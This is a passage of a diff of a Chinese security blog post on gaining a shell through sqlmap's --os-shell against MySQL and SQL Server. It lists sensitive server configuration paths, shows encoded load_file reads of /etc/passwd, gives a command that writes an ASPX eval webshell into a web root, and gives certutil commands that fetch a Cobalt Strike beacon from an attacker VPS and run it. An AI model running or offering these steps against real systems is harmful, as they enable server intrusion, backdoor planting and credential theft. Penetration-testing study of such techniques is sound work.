class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件 <br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/sysconfig/iptables 查看防火墙策略 <br>load_file(<span class="hljs-built_in">char</span>(47)) 可以列出FreeBSD,Sunos系统根目录 <br><span class="hljs-keyword">replace</span>(load_file(0×2F6574632F706173737764),0×3c,0×20) <br><span class="hljs-keyword">replace</span>(load_file(<span class="hljs-built_in">char</span>(47,101,116,99,47,112,97,115,115,119,100)),<span class="hljs-built_in">char</span>(60),<span class="hljs-built_in">char</span>(32))<br>etc/php.ini          php配置文件<br>/etc/httpd/<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">d</span>/php.<span class="hljs-keyword">conf</span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>        Apache配置文件<br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span>  虚拟目录配置文件<br></code></pre></div></td></tr></table></figure></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略 </span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 </span><br><span class="line">&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件 </span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件 </span><br><span class="line">&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本 </span><br><span class="line">&#x2F;etc&#x2F;issue </span><br><span class="line">&#x2F;etc&#x2F;issue.net </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;local&#x2F;apche&#x2F;conf&#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;local&#x2F;apche&#x2F;conf&#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上 </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables 查看防火墙策略 </span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 </span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line">etc&#x2F;php.ini          php配置文件</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf        Apache配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf  虚拟目录配置文件</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p>
 <p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径    </p>
 </li>
 </ul>
 <h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p>
 <h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul>
 <li>数据库支持外连</li>
 <li>数据库权限为SA权限</li>
@@ -330,352 +212,89 @@
 <h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p>
 <p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p>
 <p>sqlmap  –os-shell 下使用，以下任意一条命令</p>
-<figure class="highlight livescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livescript"><span class="hljs-keyword">for</span> /r e:<span class="hljs-string">\</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>*.php) <span class="hljs-keyword">do</span> @echo %i  *必加<br>dir c:<span class="hljs-string">\</span> d:<span class="hljs-string">\</span>  /s /b | find <span class="hljs-string">&quot;icon_assignment.gif&quot;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r e:\ %i in (1*.php) do @echo %i  *必加</span><br><span class="line">dir c:\ d:\  &#x2F;s &#x2F;b | find &quot;icon_assignment.gif&quot;</span><br></pre></td></tr></table></figure>
 
 <p>查找文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p>
 <h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p>
 <h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p>
 <p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:/temp/ ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p>
 <ul>
 <li>mysql拿shell的难点在于寻找绝对路径</li>
 <li>sqlserver在于xp_cmdshell 是否开启。</li>
 </ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">yhy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://fireline.fun/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/">https://fireline.fun/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://fireline.fun" target="_blank">yhy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a><a class="post-meta__tags" href="/tags/getshell/">getshell</a></div><div class="post_share"><div class="social-share" data-image="/img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/11/SScan/"><img class="prev-cover" src="/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SScan  一款src捡洞扫描器</div></div></a></div><div class="next-post pull-right"><a href="/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">简单dockers逃逸学习</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yhy</div><div class="author-info__description">修道之初, 谁不想当剑仙?</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yhy0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yhy0" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">切换主题了</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlMap-%E2%80%93os-shell-%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">SqlMap –os-shell 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">寻找绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E2%80%93os-shell"><span class="toc-number">1.1.3.</span> <span class="toc-text">执行–os-shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SqlServer"><span class="toc-number">1.2.</span> <span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">必要条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">寻找绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E9%A9%AC%E6%88%96%E8%80%85%E8%BF%9Ecs"><span class="toc-number">1.2.3.</span> <span class="toc-text">上一句话马或者连cs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">写一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">上线CS</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/" title="git 蜜罐复现"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="git 蜜罐复现"/></a><div class="content"><a class="title" href="/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/" title="git 蜜罐复现">git 蜜罐复现</a><time datetime="2021-08-09T12:30:00.000Z" title="发表于 2021-08-09 20:30:00">2021-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/" title="Java ysoserial学习之CommonsCollections5(四)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections5(四)"/></a><div class="content"><a class="title" href="/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/" title="Java ysoserial学习之CommonsCollections5(四)">Java ysoserial学习之CommonsCollections5(四)</a><time datetime="2021-07-01T13:18:00.000Z" title="发表于 2021-07-01 21:18:00">2021-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/" title="Java ysoserial学习之CommonsCollections6(三)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections6(三)"/></a><div class="content"><a class="title" href="/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/" title="Java ysoserial学习之CommonsCollections6(三)">Java ysoserial学习之CommonsCollections6(三)</a><time datetime="2021-06-27T14:09:00.000Z" title="发表于 2021-06-27 22:09:00">2021-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/" title="Java ysoserial学习之CommonsCollections1(二)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections1(二)"/></a><div class="content"><a class="title" href="/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/" title="Java ysoserial学习之CommonsCollections1(二)">Java ysoserial学习之CommonsCollections1(二)</a><time datetime="2021-06-11T12:30:00.000Z" title="发表于 2021-06-11 20:30:00">2021-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/" title="Java ysoserial学习之URLDNS(一)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之URLDNS(一)"/></a><div class="content"><a class="title" href="/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/" title="Java ysoserial学习之URLDNS(一)">Java ysoserial学习之URLDNS(一)</a><time datetime="2021-06-04T12:30:00.000Z" title="发表于 2021-06-04 20:30:00">2021-06-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By yhy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://fireline.fun/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/sqlmap%E4%BD%BF%E7%94%A8/">sqlmap使用</a>
-                    
-                      <a class="hover-with-bg" href="/tags/getshell/">getshell</a>
-                    
-                  </div>
-                
-              </div>
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
 
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/01/11/SScan/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SScan  一款src捡洞扫描器</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">
-                        <span class="hidden-mobile">简单dockers逃逸学习</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
 
-            
-              <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-    <div id="msg">来杯奶茶</div>
-
-    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-      <span>赏</span>
-    </button>
-    <div id="QR" style="display: none;">
-        <div id="wechat" style="display: inline-block">
-          <img id="wechat_qr" src="/img/wechatpay.jpg" srcset="/img/loading.gif" lazyload alt="微信打赏"/>
-          <p>微信打赏</p>
-        </div>
-    </div>
-</div>
-
-            
-
-            <!-- Custom -->
-            
-              <div class="col-lg-7 mx-auto nopadding-x-md">
-                <div class="container custom post-custom mx-auto">
-                  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210618143758.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5">
-                </div>
-              </div>
-            
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments" lazyload>
-                
-                  
-                
-                
-  <div id="valine"></div>
-  <script type="text/javascript">
-    Fluid.utils.lazyComments('valine', function() {
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#valine",
-          app_id: "vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz",
-          app_key: "GB9a9tvf5zPbYaxUShE01qk1",
-          placeholder: "说点什么",
-          path: window.location.pathname,
-          avatar: "robohash",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: false,
-          serverURLs: "https://vid2hnaa.lc-cn-n1-shared.com",
-        });
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the
-    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
-  </noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-
-
-    
-
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
